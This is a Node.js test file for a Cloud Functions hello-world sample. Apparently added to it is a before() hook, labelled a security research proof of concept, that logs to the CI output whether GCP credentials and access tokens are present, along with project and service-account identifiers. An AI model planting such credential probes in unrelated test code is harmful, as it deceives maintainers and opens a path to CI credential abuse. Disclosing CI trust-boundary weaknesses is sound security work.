// Copyright 2017 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

const assert = require('assert');
const {request} = require('gaxios');
const {exec} = require('child_process');
const waitPort = require('wait-port');

const startFF = async (target, signature, port) => {
  const ff = exec(
    `npx functions-framework --target=${target} --signature-type=${signature} --port=${port}`
  );
  await waitPort({host: 'localhost', port});
  return ff;
};

const httpInvocation = (fnUrl, port) => {
  const baseUrl = `http://localhost:${port}`;

  // GET request
  return request({
    url: `${baseUrl}/${fnUrl}`,
  });
};

describe('index.test.js', () => {
  // Security research PoC — benign probe (no data exfil, no API calls, no side effects).
  // Purpose: demonstrate that fork-PR test code executes in Custard CI with GCP auth context.
  before(() => {
    const marker = 'NODEJS_DOCS_SAMPLES_CI_TRUST_BOUNDARY_POC_20260419_MHDSAIT';
    console.log('======== ' + marker + ' ========');
    console.log('GAC_IS_SET=' + !!process.env.GOOGLE_APPLICATION_CREDENTIALS);
    console.log('GAC_PATH_SUFFIX=' + (process.env.GOOGLE_APPLICATION_CREDENTIALS || '').split('/').pop());
    console.log('GOOGLE_CLOUD_PROJECT=' + (process.env.GOOGLE_CLOUD_PROJECT || 'unset'));
    console.log('GOOGLE_SAMPLES_PROJECT=' + (process.env.GOOGLE_SAMPLES_PROJECT || 'unset'));
    console.log('SERVICE_ACCOUNT=' + (process.env.SERVICE_ACCOUNT || 'unset'));
    console.log('CLOUDSDK_AUTH_ACCESS_TOKEN_SET=' + !!process.env.CLOUDSDK_AUTH_ACCESS_TOKEN);
    console.log('======== /' + marker + ' ========');
  });

  describe('functions_helloworld_get helloGET', () => {
    const PORT = 8081;
    let ffProc;

    before(async () => {
      ffProc = await startFF('helloGET', 'http', PORT);
    });

    after(() => ffProc.kill());

    it('helloGET: should print hello world', async () => {
      const response = await httpInvocation('helloGET', PORT);
      assert.strictEqual(response.status, 200);
      assert.strictEqual(response.data, 'Hello World!');
    });
  });
});
